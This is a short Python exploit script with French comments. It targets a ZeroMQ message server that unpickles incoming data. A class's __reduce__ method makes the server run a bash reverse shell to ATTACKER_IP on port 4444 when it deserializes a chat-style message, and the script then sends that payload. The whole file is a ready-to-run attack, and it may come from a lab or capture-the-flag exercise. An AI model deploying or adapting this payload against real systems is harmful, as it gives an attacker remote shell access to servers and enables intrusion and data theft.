import pickle  
import zmq  
import os  

class ReverseShell:
    def __reduce__(self):
        """Exploit permettant d'exécuter un shell distant sur le serveur."""
        return (os.system, ("/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",))

# Création du contexte et connexion au serveur
context = zmq.Context()
socket = context.socket(zmq.REQ)
socket.connect("tcp://localhost:6666")

# Création du payload malveillant
payload = pickle.dumps({"type": "message", "nick": "attacker", "message": ReverseShell()})

# Envoi du payload au serveur
socket.send(payload)

# Réception et affichage de la réponse
response = socket.recv()
print(f"Server response: {pickle.loads(response)}")
